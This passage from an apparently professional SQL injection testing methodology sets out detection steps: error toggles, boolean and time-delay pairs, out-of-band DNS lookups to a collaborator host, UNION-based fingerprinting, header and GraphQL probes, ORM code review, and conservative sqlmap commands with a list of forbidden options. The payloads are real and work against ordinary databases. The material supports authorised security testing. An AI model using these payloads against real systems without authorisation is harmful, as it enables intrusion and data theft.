| PostgreSQL | `syntax error at or near`, `unterminated quoted string at or near`, `invalid input syntax for type integer` |
| SQL Server | `Unclosed quotation mark after the character string`, `Incorrect syntax near`, `Conversion failed when converting the varchar value` |
| Oracle | `ORA-00933: SQL command not properly ended`, `ORA-01756: quoted string not properly terminated` |
| SQLite | `unrecognized token`, `near "…": syntax error` |
| MS Access | `Microsoft JET Database Engine`, `Microsoft Office Access Database Engine` |
| ORM layers | `org.hibernate.query.SyntaxException`, `SequelizeDatabaseError`, `django.db.utils.ProgrammingError`, `Illuminate\Database\QueryException` with `SQLSTATE[…]` |

Correct: every probe returns the same result as an ordinary non-matching search (an empty list), or a `400` validation error that names the field, with no database text.

#### Evaluation

- **Fail (SQLi):** a database syntax error for `'` that disappears with `''`, or a concatenation probe that returns the original results. Either shows your input is parsed as SQL.
- **Fail (separate, Low):** database error text, query fragments or stack traces in responses, even where you could not show injection (CWE-209; `v5.0.0-16.5.1`).
- **Lead, not a finding:** a generic `500` for `'` and a normal response for `''`. Continue with tests 3 and 4 to confirm.
- **Pass:** no difference between probes beyond what the application's validation explains.

#### False positives

WAF block pages, input-parsing `500`s and validation messages that echo your input; see [Signals and false positives](#signals-and-false-positives). A `500` for `'` that also appears for `''` is not SQLi.

#### Automation

Burp Scanner's passive and active checks flag database error strings; Backslash Powered Scanner looks for the "breaks with one character, repaired by two" pattern generically. In CI, a test that sends `'` to every query parameter and asserts no `5xx` and no driver error text is cheap and catches regressions in error handling (see [Regression tests](#regression-tests)).

### GT-WEB-SQLI-3: Boolean-based detection with true and false pairs

*Guler Tech methodology.* Implements the boolean exploitation technique of WSTG-INJT-05 as a detection step, and the MS Access sub-page's `IIF`-based variant.

#### What it checks

Whether adding a condition that is always true leaves the response unchanged while an always-false condition changes it. This works when errors are hidden, which is the common case.

#### Prerequisites

An input from the work list; ideally one where the normal value returns at least one result, so a false condition has something to remove.

#### Steps

1. Pick pairs that match the context. Each line is one request; send each pair at least twice:

```text
gifts' AND '1'='1          string context, true
gifts' AND '1'='2          string context, false
1002 AND 1=1               numeric context, true
1002 AND 1=2               numeric context, false
1003-1                     numeric context, arithmetic (should behave like 1002)
gifts'-- -                 string context, rest of the query commented out (MySQL needs the space after --)
```

2. Compare the true response with the baseline and the false response with an ordinary "no results" response. Use Comparer on the bodies, not only the length.
3. If the context is unclear, the arithmetic probe is the cleanest: `1003-1` returning record 1002 means the database evaluated an expression you wrote.
4. For MS Access, where comments and many functions are missing, WSTG uses `IIF(1=1, …)` expressions and a null byte to truncate the query; use the `IIF` form for the pair.
5. Never use the `OR` form (`' OR '1'='1`) outside a lab; see [Before you start](#before-you-start).

#### Observation

Vulnerable (illustrative): the true pair returns the 14 `gifts` products, the false pair returns an empty list, and `gifts` with a random suffix also returns an empty list.

```http
GET /api/products?category=gifts%27%20AND%20%271%27%3D%271 HTTP/1.1
Host: app.example.com

HTTP/1.1 200 OK
Content-Type: application/json

{"count":14,"items":[…]}
```

```http
GET /api/products?category=gifts%27%20AND%20%271%27%3D%272 HTTP/1.1
Host: app.example.com

HTTP/1.1 200 OK
Content-Type: application/json

{"count":0,"items":[]}
```

Correct: both pair members behave like a search for the literal string `gifts' AND '1'='1` (no results), so they match each other.

#### Evaluation

- **Fail:** true behaves like the baseline, false behaves like "no results", repeatably, and the difference flips when you swap the conditions. Or the arithmetic probe is evaluated.
- **Pass:** the pair members return the same response.
- One pair is a lead; two different pairs (for example `'1'='1`/`'1'='2` and `2>1`/`2>3`) that agree are a confirmation.

#### False positives

Lenient integer parsing (the suffix is discarded, so both members return record 1002: no difference, no finding); caching (both members get the same cached page); search engines that treat `AND` as a search keyword (the true member then returns fewer results than the baseline, not the same).

#### Automation

sqlmap's boolean technique (`--technique B`) does the same comparison with statistics; see test 12. Burp Intruder with two payloads and a response-diff column works for a handful of inputs at a low rate.

### GT-WEB-SQLI-4: Time-based detection with bounded delays

*Guler Tech methodology.* Implements the time-delay exploitation technique of WSTG-INJT-05 as a detection step, with the delay functions documented in the MySQL, SQL Server and PostgreSQL sub-pages and in PortSwigger's SQL injection cheat sheet.

#### What it checks

Whether an injected delay function runs, when nothing in the response content changes (inserts, logging, asynchronous handlers, fully generic error pages).

#### Prerequisites

A stable baseline response time (send the normal request five times and note the spread); agreement that time-based testing is allowed on this host.

#### Steps

1. Use one engine-specific payload at a time, 3 seconds, in the right context. One line each (string contexts shown; drop the quotes for numeric contexts):

```text
gifts' AND (SELECT 1 FROM (SELECT SLEEP(3))x)-- -           MySQL / MariaDB
gifts'||(SELECT '' FROM pg_sleep(3))||'                      PostgreSQL
gifts'; WAITFOR DELAY '0:0:3'--                              SQL Server (needs stacked queries)
gifts'||DBMS_PIPE.RECEIVE_MESSAGE('gt',3)||'                 Oracle (needs EXECUTE on DBMS_PIPE)
```

2. If the delay appears, repeat with `0` and with `6`. A real injection scales: about baseline, about 3 s, about 6 s.
3. Interleave: control, payload, control, payload. Three consistent repetitions are enough. Stop there.
4. If you know the engine but not the context, try the numeric form (`1002 AND (SELECT 1 FROM (SELECT SLEEP(3))x)`) before guessing more variants.
5. MS Access and SQLite have no sleep function; WSTG mentions "heavy queries" for Access. Do not use heavy queries on client systems; rely on error and boolean tests there.

```bash
for d in 0 3 6 0 3; do
  curl -s -o /dev/null -w "delay=$d time=%{time_total}\n" -b 'session=<SESSION_USER_A>' \
    "https://app.example.com/api/products?category=gifts%27%7C%7C(SELECT%20%27%27%20FROM%20pg_sleep($d))%7C%7C%27"
  sleep 2
done
```

#### Observation

Vulnerable (illustrative):

```text
delay=0 time=0.212
delay=3 time=3.247
delay=6 time=6.231
delay=0 time=0.198
delay=3 time=3.260
```

Correct: all five times sit within the baseline spread.

#### Evaluation

- **Fail:** response time tracks the injected delay (within about a second) across at least three requests, and the zero-delay control stays at baseline.
- **Pass:** no correlation between injected value and response time.
- A single long response is not a result. Neither is a delay that appears for the control too.

#### False positives

Rate limiting, throttling and queueing (delays that grow with request count, not with the injected value); cold starts; a WAF that tarpits suspicious requests (the delay appears for any payload, whatever number you put in it); per-row evaluation making delays a multiple of your value (that is still injection, but it means the payload is running once per row, so stop and use a single-row filter).

#### Automation

sqlmap's time technique (`--technique T --time-sec 3`); Burp Scanner's time-based checks. Both send many delayed requests; on production, prefer to confirm one manual lead rather than scanning for new ones.

### GT-WEB-SQLI-5: Out-of-band detection with a collaborator you control

*Guler Tech methodology.* Implements the out-of-band exploitation technique of WSTG-INJT-05 as a detection step only, with the network functions listed in the Oracle and SQL Server sub-pages and PortSwigger's cheat sheet.

#### What it checks

Whether the database makes a network lookup you caused, when neither content nor timing gives a usable signal. This is the technique of choice for asynchronous processing (exports, imports, queued jobs), where the vulnerable query runs long after your request returned.

#### Prerequisites

Agreement that OOB testing is allowed; a collaborator subdomain from Burp Collaborator or your own interactsh server; an idea of the engine (tests 2 to 4, or the client).

#### Steps

1. Generate a fresh subdomain for this input and note the request it goes into.
2. Send one engine-specific payload. Static marker only, nothing from the database in the hostname:

```text
gifts'; EXEC master..xp_dirtree '//sqli5-a.<id>.oob.example.org/x'--           SQL Server (stacked queries)
gifts'||UTL_INADDR.GET_HOST_ADDRESS('sqli5-b.<id>.oob.example.org')||'          Oracle (needs network ACL privileges)
gifts'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "http://sqli5-c.<id>.oob.example.org/">%x;]>'),'/l') FROM dual)||'   Oracle, unpatched XML parser only
```

3. Poll the collaborator. Record the interaction type (DNS, HTTP), time and source.
4. Send a **control**: the same hostname in the same parameter without SQL syntax (`category=sqli5-d.<id>.oob.example.org`). If the control also triggers a lookup, something other than the database is resolving hostnames it sees.
5. For asynchronous paths, wait for the job to run (ask the client how often) and poll again before concluding.

What not to use, even though public cheat sheets list it:

- **PostgreSQL:** the usual OOB primitive is `COPY … TO PROGRAM 'nslookup …'`, which runs an operating-system command as the database server user and needs superuser or `pg_execute_server_program`. That is command execution, out of scope here; use time-based detection on PostgreSQL instead.
- **MySQL:** OOB works only on Windows hosts, through `LOAD_FILE()` on a UNC path (a file-read function that needs the `FILE` privilege and makes an SMB connection) or `INTO OUTFILE` (a file write). Both are outside the safe-proof rules.
- **SQL Server:** `xp_dirtree` with a UNC path starts with a DNS lookup and continues with an SMB connection. Your listener must answer DNS only, so you see the lookup and never receive the service account's authentication attempt.

#### Observation

Vulnerable (illustrative Collaborator entry):

```text
Type: DNS   Query: sqli5-a.<id>.oob.example.org   Record: A   From: 198.51.100.23   Time: 14:02:11 UTC
```

No interaction for the control `sqli5-d`.

#### Evaluation

- **Fail:** a DNS or HTTP interaction for the payload's unique subdomain, none for the control, at a time consistent with the request or the job schedule.
- **Pass:** no interaction for any payload after the job window has passed.
- The source IP is often a recursive resolver, not the database host. That is normal for DNS and does not weaken the result; HTTP interactions (where they occur) show the egress address.

#### False positives

Security appliances, link scanners and logging pipelines that resolve every hostname in traffic (the control catches these); a previous test reusing the same subdomain (always generate a new one); a different component, such as a PDF renderer or an XML parser elsewhere in the request path, that fetched the URL (that may be an SSRF or XXE finding instead, in other notes of this series).

#### Automation

Burp Scanner uses Collaborator for its OOB checks automatically. sqlmap's `--dns-domain` option is built for DNS **exfiltration** and is out of scope.

### GT-WEB-SQLI-6: Fingerprint the database and confirm version and current user

*Guler Tech methodology.* Implements "Fingerprinting the Database" and the UNION and error-based techniques of WSTG-INJT-05, limited to the version banner, current user and current database, with the engine-specific functions from the Oracle, MySQL, SQL Server, PostgreSQL and MS Access sub-pages.

#### What it checks

Which engine is behind the injection, and a final proof that you can run a query of your own. This is the deepest proof this note uses: it shows the impact class without touching application data.

#### Prerequisites

A confirmed lead from tests 2 to 5.

#### Steps

1. **Fingerprint with what you already have.** The error text (test 2), the working concatenation operator, the comment syntax (`#` works only on MySQL; MySQL needs a space after `--`), and the delay function that worked (test 4) usually settle it. One extra boolean pair can confirm:

```text
gifts' AND 1::int=1 AND '1'='1            PostgreSQL cast syntax: true only on PostgreSQL
gifts' AND LEN('ab')=2 AND '1'='1          SQL Server (LEN also exists in MS Access, not in MySQL or PostgreSQL)
gifts' AND 'a' 'b'='ab                    MySQL adjacent-literal concatenation
gifts' AND (SELECT 'a' FROM dual)='a      Oracle needs FROM dual; MySQL accepts it too, PostgreSQL and SQL Server error
```

2. **Confirm with the version and current user: pick one channel.**

   **Error-based** (one request, when errors are shown). Force a type conversion of the banner so the error message carries it:

```text
gifts' AND 1=CAST(version() AS int)-- -                    PostgreSQL: "invalid input syntax for type integer: "PostgreSQL 16…""
gifts' AND 1=CONVERT(int,@@version)--                      SQL Server: "Conversion failed when converting the nvarchar value 'Microsoft SQL Server…'"
gifts' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -      MySQL: "XPATH syntax error: '~8.0…'"
```

   **UNION-based** (when the page displays query results). Find the column count with `ORDER BY 1`, `ORDER BY 2`, … until the error, or with `UNION SELECT NULL,NULL,…`. Then make the original query return **no rows** (a value that matches nothing) so the page shows only your row, and put the banner and user in columns that are displayed:

```text
nomatch' UNION SELECT NULL,@@version,CURRENT_USER()-- -                      MySQL
nomatch' UNION SELECT NULL,version(),current_user-- -                       PostgreSQL
nomatch' UNION SELECT NULL,@@version,SYSTEM_USER--                          SQL Server
nomatch' UNION SELECT NULL,banner,USER FROM v$version WHERE ROWNUM=1--      Oracle
```

   **Blind** (boolean or time only). Do not extract the banner character by character by hand. Confirm a single fact with one or two pairs (`AND SUBSTRING(@@version,1,1)='8'` versus `'7'`), or let sqlmap read `--banner` and `--current-user` with the settings in test 12.

3. Current database name, if useful for the report: `DATABASE()` (MySQL), `current_database()` (PostgreSQL), `DB_NAME()` (SQL Server), `SYS_CONTEXT('USERENV','DB_NAME')` (Oracle). SQLite has `sqlite_version()` and no users. MS Access has no version function; the error signature from test 2 is the fingerprint.
4. Stop. Do not list databases, tables or columns, and do not query `information_schema`, `pg_catalog`, `sys.*` or `all_tables`.
5. For Oracle web tiers, WSTG's Oracle sub-page also fingerprints the PL/SQL Gateway (`Server: Oracle-REST-Data-Services/…`, `mod_plsql`, `Oracle-HTTP-Server`). Note these in the report; testing the gateway itself is a separate WSTG exercise.

#### Observation

Vulnerable (illustrative UNION result):

```json
{"count":1,"items":[{"id":null,"name":"PostgreSQL 16.4 on x86_64-pc-linux-gnu","price":"shop_app"}]}
```

#### Evaluation

- **Fail (confirmed):** the response shows the engine's version banner or the current database user, which can only come from a query you wrote.
- Record the database user: `shop_app` is an application account; `postgres`, `sa`, `root`, `SYS` or `rdsadmin`-style names suggest high privileges and push the [rating](#rating-findings) up. Ask the client to confirm the account's privileges rather than testing them.

#### False positives

Very few at this stage. Make sure the "version" is not the application's own version string (`/api/version` content reflected in a template) and that UNION rows are yours (the `nomatch` value guarantees the original query returned nothing).

#### Automation

sqlmap `--banner --current-user --current-db` with the constraints in test 12.

### GT-WEB-SQLI-7: ORDER BY, column, table and LIMIT injection

*Guler Tech methodology.* Implements WSTG-INJT-05 for clauses that take identifiers and keywords, following the SQL Injection Prevention Cheat Sheet's note that structural parts cannot be parameterised and must be allow-listed.

#### What it checks

Whether sort fields, sort directions, column lists, table or report names and paging values are concatenated into the query instead of mapped to fixed values.

#### Prerequisites

List endpoints with sort, field, table or paging parameters (test 1); at least three rows in the result so that order changes are visible.

#### Steps

1. **Does the value reach the query at all?** `sort=price` and `sort=name` should give different orders. `sort=nosuchcolumn` is the key probe: an allow-list returns `400` or falls back to the default order; concatenation returns a database error (`Unknown column 'nosuchcolumn' in 'order clause'`, `column "nosuchcolumn" does not exist`).
2. **Position numbers.** `sort=1` and `sort=2` sort by the first and second selected column on most engines; `sort=99` produces an out-of-range error. Either shows the value is SQL.
3. **Boolean pair in ORDER BY.** UNION does not work here, but a `CASE` does. One line each:

```text
sort=(CASE WHEN 1=1 THEN name ELSE price END)          true: ordered by name
sort=(CASE WHEN 1=2 THEN name ELSE price END)          false: ordered by price
```

4. **Direction.** `dir=asc`, `dir=desc`, then `dir=asc,id` (a second sort key: no error and a changed tie order means concatenation) and `dir=sideways` (an error means the value reached SQL).
5. **Column lists.** `fields=id,name` versus `fields=id,name,1` (a constant column appears) or `fields=id,(SELECT 1)`.
6. **Table or report names.** `report=orders` versus `report=orders gt` (`gt` becomes a table alias: same result, no error, which only happens if the value is spliced into `FROM`). Do not point the parameter at other tables.
7. **LIMIT and OFFSET.** `limit=2` versus `limit=1+1`: PostgreSQL evaluates the expression and returns two rows; MySQL rejects it with a syntax error (MySQL only accepts constants there). Both show concatenation; an allow-listed integer returns `400` or two rows only if the application did the arithmetic itself.
8. **Time-based in ORDER BY: avoid.** An expression in ORDER BY can be evaluated per row. If you have no other signal, combine with a filter that returns one row.
9. **GraphQL:** an `orderBy` argument typed as an enum is validated by the schema; typed as `String`, run the same probes in the argument.

```http
GET /api/products?category=gifts&sort=(CASE%20WHEN%201%3D2%20THEN%20name%20ELSE%20price%20END)&dir=asc HTTP/1.1
Host: app.example.com
Cookie: session=<SESSION_USER_A>
```

#### Observation

Vulnerable (illustrative): `sort=nosuchcolumn` returns `500` with `column "nosuchcolumn" does not exist`; the `CASE … 1=1` request is sorted by name and the `1=2` request by price.

Correct: `sort=nosuchcolumn` returns `400 {"error":"invalid sort field"}` (or the default order), and `CASE` expressions are rejected the same way.

#### Evaluation

- **Fail (SQLi):** a `CASE` pair changes the order, an arithmetic or alias probe is evaluated, or unknown identifiers produce database errors.
- **Fail (weaker, separate):** the value is quoted as an identifier (no SQLi), but any column of the table is accepted. Sorting or filtering by a column the user cannot see (`password_reset_token`, `internal_score`) leaks information one comparison at a time; report it as an allow-list gap, typically Medium or Low depending on the column. The same applies to Spring Data's `JpaSort.unsafe` or Laravel's `orderBy($request->sort)` even when the framework quotes the name.
- **Pass:** only documented values are accepted; everything else is rejected or ignored.

#### False positives

Applications that sort in memory after the query (the order changes but the value never reached SQL; `nosuchcolumn` then gives an application error such as a `KeyError`, not a database one); client-side sorting in the SPA.

#### Automation

sqlmap can test an ORDER BY parameter when pointed at it with `-p sort`, but its boolean comparison relies on content differences, and order-only differences are easy to miss. Manual `CASE` pairs are faster and quieter. In CI, test every sortable endpoint with an unknown field and assert a `400`.

### GT-WEB-SQLI-8: IN lists, search filters and LIKE wildcards

*Guler Tech methodology.* Implements WSTG-INJT-05 for list and filter contexts and the SQL wildcard injection section of WSTG-INJT-05.

#### What it checks

Whether list parameters, filter objects and search terms are built into SQL by hand, and whether LIKE wildcards are left active in parameterised searches.

#### Prerequisites

Endpoints that take lists (`ids=1,2`, `ids[]=1`, JSON arrays), structured filters, or free-text search (test 1).

#### Steps

1. **IN lists.** With your own IDs `1001,1002` as the baseline, one request per line:

```text
ids=1001,1002)                          unbalanced bracket: error if concatenated
ids=1001,1002) AND (1=1                 true: same as baseline
ids=1001,1002) AND (1=2                 false: empty
ids=1001,1003-1                         arithmetic: returns 1001 and 1002
```

2. **Arrays.** Repeat with each array syntax the endpoint accepts: `ids[]=1001&ids[]=1002'`, and in JSON `{"ids": [1001, "1002'"]}` and `{"ids": [1001, "1002) AND (1=2"]}`. Mixed types are interesting: a builder that joins numbers safely may still join strings unsafely.
3. **Filter objects.** If the API takes a filter map, probe keys and operators as well as values, one request each:

```json
{"filter": {"status": "open'"} }
```

```json
{"filter": {"status'": "open"} }
```

```json
{"filter": {"price": {"op": "nosuchop", "value": 10} } }
```

   A database error for the key or operator means the builder uses them as SQL text.
4. **Search terms.** Run the string probes from tests 2 and 3 on the search box (`gifts'`, `gifts''`, the concatenation probe). Searches are often `LIKE '%…%'` contexts, where the application appends `%'` after your input, so the plain true/false pair from test 3 ends in `'1'='1%'` and is false both ways. Use a pair whose last comparison is itself a LIKE, so the appended `%` does no harm:

```text
gifts%' AND 'a' LIKE 'a          true: becomes … AND 'a' LIKE 'a%'
gifts%' AND 'b' LIKE 'a          false: becomes … AND 'b' LIKE 'a%'
```

5. **Wildcards in parameterised LIKE.** Separate question, separate finding: does `q=%` return everything, does `q=_` match any single character, does `q=gi_ts` match `gifts`? On an exact-match lookup (discount codes, invite codes, email addresses) that is a finding; on a product search it is usually by design.

#### Observation

Vulnerable (illustrative): `ids=1001,1002)` returns `500` with `syntax error at or near ")"`; the `(1=1` request returns both of your orders and `(1=2` returns none.

Correct: `400 {"error":"ids must be integers"}` for every probe; `q=%` searches for a literal percent sign (or the application documents wildcards as a feature).

#### Evaluation

- **Fail (SQLi):** a list, key or operator probe produces a database error that toggles, or a true/false pair differs.
- **Fail (CWE-155, usually Low–Medium):** wildcards match on a lookup that should be exact, with impact depending on what can be enumerated.
- **Pass:** non-integer list members are rejected, filter keys and operators come from fixed maps, wildcards are escaped where exact matching is intended.

#### False positives

Search features that document wildcard syntax; filters evaluated in application code rather than SQL (errors then come from the application, not the database).

#### Automation

sqlmap with the `*` marker on one list element in a saved request (test 12). For CI, property-based tests that throw quotes, brackets and SQL keywords into list and filter inputs and assert a `400` (see [Regression tests](#regression-tests)).

### GT-WEB-SQLI-9: JSON bodies, encoded payloads, headers, cookies and GraphQL arguments

*Guler Tech methodology.* Implements WSTG-INJT-05's instruction to consider hidden fields, HTTP headers and cookies, the SQL Server sub-page's `Referer`/`User-Agent` example, and the GraphQL SQL injection section of WSTG-APIT-99.

#### What it checks

Whether inputs outside the obvious query string reach SQL: JSON fields and types, values wrapped in base64, JSON or XML inside another parameter, request headers, non-session cookies, and GraphQL arguments.

#### Prerequisites

The work list from test 1 with locations and encodings filled in.

#### Steps

1. **JSON bodies.** Run the probes from tests 2 to 4 inside string fields. Also change the type: send a number field as a string (`{"id": "1002'"}`, `{"id": "1003-1"}`), because some handlers concatenate strings they expected to be numbers.

```http
POST /api/orders/search HTTP/1.1
Host: api.example.com
Authorization: Bearer <TOKEN_USER_A>
Content-Type: application/json

{"status": "open' AND '1'='2", "page": 1}
```

2. **Encoded wrappers.** Decode, change one field, re-encode, send. Burp's Inspector and Decoder do this in place; a shell works too:

```bash
echo -n '{"user_id": "5755 AND 1=2", "list": "news"}' | base64   # illustrative wrapper for ?p=
```

   If the wrapper is signed or MAC'd and the server rejects your change, the field is not attacker-controlled; note it and move on. XML inside a parameter or body (SOAP, import files, `xml=` fields) is tested the same way: put probes in text nodes and keep the document well formed, escaping quotes as `&apos;` inside attributes.
3. **Headers.** Probe `User-Agent`, `Referer`, `X-Forwarded-For`, `Accept-Language` and any custom header the application reads (`X-Tenant`, `X-Device-Id`), plus the token in `Authorization` if the server looks tokens up in a database (the FortiWeb case in [Real-world cases](#real-world-cases)). Logging and analytics code often stores headers with an `INSERT`: use the error toggle or a short time-based payload (the request is slower only if logging is synchronous), or an OOB payload for asynchronous logging. Never boolean `OR` payloads in an `INSERT`.

```http
GET / HTTP/1.1
Host: app.example.com
User-Agent: Mozilla/5.0 (GT-SQLI-9)'||(SELECT '' FROM pg_sleep(3))||'
```

4. **Cookies.** Non-session cookies (`TrackingId`, `lang`, `last_store`, `cart`) are classic blind SQLi points; PortSwigger's blind labs use a tracking cookie for this reason. Run the boolean pair first.
5. **GraphQL arguments.** Probe `String` arguments, and prefer variables so the GraphQL syntax stays valid:

```graphql
query Products($f: String) {
  products(filter: $f) { id name }
}
```

```json
{"f": "gifts' AND '1'='2"}
```

   Database errors often come back in `errors[].message` with a `200 OK` status. Check enum and `Int` arguments too: a schema that validates them is fine, but custom scalars (`JSON`, `Filter`) are passed through as-is.
6. Keep each request to one changed input, as in every other test.

#### Observation

Vulnerable (illustrative GraphQL error):

```json
{"data": {"products": null}, "errors": [{"message": "syntax error at or near \"2\"", "path": ["products"]}]}
```

Correct: the field returns an empty list for the payload, or a GraphQL validation error that is about the argument, not about SQL.

#### Evaluation

Same criteria as tests 2 to 5, applied to the new location. Report the location precisely (header name, cookie name, JSON path, GraphQL field and argument, encoding layers), because the fix and the WAF rule depend on it.

#### False positives

Headers that a reverse proxy or CDN overwrites before the application sees them (your value never arrives; check with a harmless marker reflected somewhere, or ask for logs); GraphQL gateways that return generic `INTERNAL_SERVER_ERROR` for any resolver exception (look for a toggle, not an error string).

#### Automation

sqlmap tests cookies from `--level 2` and `User-Agent`/`Referer` from `--level 3`, but `-p` names a parameter explicitly and bypasses the level requirement, which is the quieter choice. For JSON, XML, GraphQL variables or a field inside a wrapper, save the request from Burp and put `*` where the payload goes (test 12). InQL generates query templates for every field and argument.

### GT-WEB-SQLI-10: Second-order injection

*Guler Tech methodology.* Implements WSTG-INJT-14 (incubated vulnerabilities: identify stored injections and the recall step) for SQL, and PortSwigger's second-order SQL injection pattern.

#### What it checks

Whether a value stored safely is later concatenated into a query in another request, another user's session, or a background job.

#### Prerequisites

Stored fields from test 1 that are reused (display name, address lines, saved search names, report titles, tags, file names, integration names); two of your own accounts where a value from one is shown to or processed for the other; the client's help to trigger admin views or scheduled jobs you cannot reach.

#### Steps

1. Store a toggle pair in two of your own records, so you can compare them later: one record gets `GT10a'`, the other `GT10a''`. Keep payloads inert: an error toggle, or a short delay, or a unique OOB subdomain for jobs you cannot watch.
2. Exercise every feature that reads the stored value, not just the page that displays it: search by it, filter by it, export, generate reports, change password or email (which may look up the user by name), duplicate or share the object, and let scheduled jobs run.
3. Compare: an error, a missing row or a failed job for `GT10a'` and normal behaviour for `GT10a''` is the second-order signal. For time-based variants, watch which later request is slow.
4. For background jobs, use an OOB payload in the stored field (`GT10'||UTL_INADDR.GET_HOST_ADDRESS('sqli10.<id>.oob.example.org')||'` on Oracle, a stacked `xp_dirtree` on SQL Server) and ask when the job runs.
5. **Clean up.** Restore every field you changed. A stored time-based payload delays every page that reads it, including other users' and administrators' views, so do not leave one in place, and prefer error toggles for fields shown to others.
6. Imports and integrations: if the application imports CSV or pulls data from a third-party service you control in the test (your own repository, your own business listing, your own webhook payload), put the toggle pair there. `API10:2023` describes this route.

#### Observation

Vulnerable (illustrative): saving the display name `GT10a'` works; the next morning the "weekly activity" export for that account fails with `500`, and the same export for the `GT10a''` account succeeds.

#### Evaluation

- **Fail:** the stored value toggles an error, a result difference, a delay or an OOB interaction in a later operation.
- **Pass:** every reader of the stored value behaves the same for both members of the pair.
- Severity depends on who triggers the vulnerable query and with which account: an administrator's report, or a job running with a privileged database account, rates higher than the user's own page.

#### False positives

Display problems caused by HTML encoding (not SQL); jobs failing for other reasons (confirm with the pair, not with one value); length limits truncating the stored value.

#### Automation

Scanners rarely find second-order bugs because they do not know which later request reads the value. sqlmap's `--second-url` and `--second-req` options point it at the page where the result appears; use them only with the test 12 constraints and only on your own records. In grey-box tests, a query log with the marker string (`GT10a`) shows directly which queries contain it.

### GT-WEB-SQLI-11: ORM, query-builder and stored-procedure review

*Guler Tech methodology.* Implements the ORM injection sub-page of WSTG-INJT-05 (identify the ORM layer, then its weak use or vulnerable versions) and the stored procedure injection section of WSTG-INJT-05, as a grey-box review backed by targeted black-box probes.

#### What it checks

Whether code that uses an ORM or stored procedures still builds SQL, HQL or JPQL from input through raw fragments, identifier arguments or dynamic SQL in the database.

#### Prerequisites

Source access or a code walk-through with the developers; the database's stored procedure definitions where they are used; the list of ORM and driver versions (lock files).

#### Steps

1. Search the code for the escape hatches in [ORM and query-builder escape hatches](#orm-and-query-builder-escape-hatches). Starting patterns (adapt to the codebase):

```bash
# JavaScript / TypeScript
grep -rnE "queryRawUnsafe|executeRawUnsafe|Prisma\.raw|sequelize\.literal|\.query\(\s*\`|knex\.raw|whereRaw|orderByRaw|\.orderBy\(\s*req\." src/
# Python / Django
grep -rnE "\.raw\(|\.extra\(|RawSQL\(|cursor\.execute\(\s*f[\"']|execute\([^,]*%[^,]*\)|text\(\s*f[\"']" app/
# Java / Spring / Hibernate
grep -rnE "createQuery\([^)]*\+|createNativeQuery\([^)]*\+|JpaSort\.unsafe|queryFor[A-Za-z]*\([^)]*\+|Statement\.execute" src/main/
# PHP / Laravel
grep -rnE "DB::raw|whereRaw|selectRaw|orderByRaw|havingRaw|DB::select\([^,]*\\\$|->orderBy\(\s*\\\$request" app/
# T-SQL / PL/pgSQL / PL/SQL
grep -rniE "exec\s*\(|sp_executesql|execute\s+immediate|execute\s+'|execute\s+format" db/
```

2. For each hit, trace whether any part of the string comes from a request, stored user data or an integration. Placeholders with bound values are fine; interpolation is a finding candidate; identifier arguments need an allow-list.
3. For HQL/JPQL, look for string concatenation into `createQuery`, `@Query` with SpEL expressions built from input, and dynamic `ORDER BY` strings. HQL is translated to SQL, so injection rules differ (not every SQL construct is valid HQL), but the error toggle and boolean pair from tests 2 and 3 still work from the outside; an HQL parser error (`org.hibernate.query.SyntaxException`, older `QuerySyntaxException`) identifies the layer.
4. For stored procedures, read the procedure body. Dynamic SQL built with `+` or `||` from a parameter, then run with `EXEC(@sql)`, `EXECUTE` or `EXECUTE IMMEDIATE`, is injectable regardless of how the application calls the procedure. Safe forms bind values (`sp_executesql` with a parameter list, `EXECUTE … USING`) and map identifiers through fixed lists.
5. Check versions against advisories: ORMs and query builders have had their own SQLi bugs (WSTG's ORM page cites Sequelize in 2019 and a Laravel query builder issue the same year; Django publishes its security advisories in its release notes). An unpatched ORM version with a known SQLi in a feature the application uses is a finding even if the application code is clean.
6. Confirm a code finding with a black-box probe (tests 2 to 8) where possible, so the report has both the line and the behaviour.

#### Observation

Vulnerable (illustrative review note):

```text
src/reports/sales.ts:42   prisma.$queryRawUnsafe(`SELECT … ORDER BY ${req.query.sort}`)   sort from query string, no allow-list
db/procs/get_report.sql   SET @sql = 'SELECT ' + @columns + ' FROM ReportTable'; EXEC(@sql)   @columns from the report builder UI
```

#### Evaluation

- **Fail:** request-influenced data reaches SQL/HQL text without binding or an allow-list, in application code or in a stored procedure.
- **Fail (dependency):** an ORM or driver version affected by a published SQLi advisory in a feature the application uses.
- **Pass:** all raw calls bind values and all identifiers come from fixed maps.

#### False positives

Raw SQL built only from constants or from configuration the user cannot influence; identifiers that pass through a strict allow-list a few lines earlier (read the whole function).

#### Automation

The Semgrep and CodeQL rules in [Static analysis](#static-analysis) cover most of the grep patterns with data-flow tracking, which removes the constant-string false positives. Dependency scanners flag ORM advisories.

### GT-WEB-SQLI-12: Confirm with sqlmap on conservative settings

*Guler Tech methodology.* Implements the automated testing step of WSTG-INJT-05 (which points to sqlmap) under this series' confirmation-only rules.

#### What it checks

Whether sqlmap independently confirms a lead you found by hand, and reads the version banner, current user and current database for the report. It is a second opinion on one parameter, not a discovery tool for the whole application.

#### Prerequisites

A specific request and parameter from tests 2 to 10; client agreement for automated testing on that host; Burp running so every sqlmap request is logged.

#### Steps

1. Save the request from Burp (Repeater → Copy to file) as `req.txt`. If the injection point is inside JSON, XML, a GraphQL variable or a header, put `*` exactly where the payload goes; sqlmap's usage guide supports the marker in requests loaded with `-r`:

```http
POST /graphql HTTP/1.1
Host: api.example.com
Authorization: Bearer <TOKEN_USER_A>
Content-Type: application/json

{"query":"query P($f: String) { products(filter: $f) { id } }","variables": {"f": "gifts*"} }
```

2. Run with confirmation-only settings, limiting the technique to the one you already saw (`B` boolean, `T` time, `E` error, `U` UNION):

```bash
sqlmap -r req.txt -p category --batch \
  --level 1 --risk 1 --technique B --threads 1 --delay 1 --time-sec 3 \
  --proxy http://127.0.0.1:8080 \
  --banner --current-user --current-db
```

   Use `-p` with the parameter name, or the `*` marker, so only one input is tested. Add `--dbms` if you know the engine, which cuts the request count.
3. Read the output for the injection type, the payload sqlmap used, and the three values. Stop there.
4. Keep sqlmap's output folder with the engagement evidence, then delete it at the end of the retention period like any other client data.

Never on client systems:

| Option | Why not |
|---|---|
| `--dump`, `--dump-all`, `--search`, `--passwords`, `--users`, `--sql-query`, `--sql-shell` | Reads data or runs arbitrary queries |
| `--os-shell`, `--os-cmd`, `--os-pwn`, `--file-read`, `--file-write`, `--reg-read`, `--priv-esc` | Operating system, file system, registry and privilege escalation |
